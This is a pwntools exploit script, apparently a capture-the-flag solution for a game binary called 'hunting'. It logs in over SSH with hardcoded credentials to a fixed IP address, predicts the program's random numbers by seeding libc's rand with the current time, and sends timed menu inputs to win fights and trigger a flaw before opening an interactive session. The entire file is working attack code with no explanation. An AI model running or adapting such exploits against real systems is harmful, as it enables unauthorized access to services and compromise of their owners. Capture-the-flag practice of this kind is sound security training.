from pwn import *
from ctypes import *
from time import sleep
libc = cdll.LoadLibrary("libc.so.6")
def getshield(nr):
    for i in range(nr):
        libc.rand()
    v1= libc.rand()
    T = ((((v1 >> 32) >> 30) + (v1 & 0xff)) & 3) - ((v1 >> 32) >> 30)
    if T == 0:
        return 1
    elif T == 1:
        return 3
    else:
        return 2
S = ssh("hunting",
        "110.10.212.133",
        port=5555,
        password="hunting")
p = S.process("/home/hunting/hunting")
libc.srand(libc.time(0))
print p.sendlineafter("choice:","3")
print p.sendlineafter("choice:","3")
print p.recvuntil("choice:")
t = log.progress("FIGHT")
nr = 1
for i in range(3):
    while 1:
        p.sendline("2")
        p.recvuntil("hp is")
        K = p.recvuntil("\n")
        p.recvuntil("=======================================\n")
        p.sendline(str(getshield(nr)))
        p.recvuntil("choice:")
        t.status(str(i)+K)
        K = int(K)
        if K < 0:
            break
t.success("Good Fight")
p.send("3\n2\n2\n")
p.sendline(str(getshield(nr)))
sleep(0.3)
p.send("3\n7\n2\n")
p.sendline(str(getshield(2)))

sleep(1.5)
print p.recv(20024)
print '-------------------------------------------------'
p.send("3\n2\n2\n")
p.sendline(str(getshield(nr)))
sleep(0.3)
p.send("3\n7\n2\n")
p.sendline(str(getshield(2)))


p.interactive()

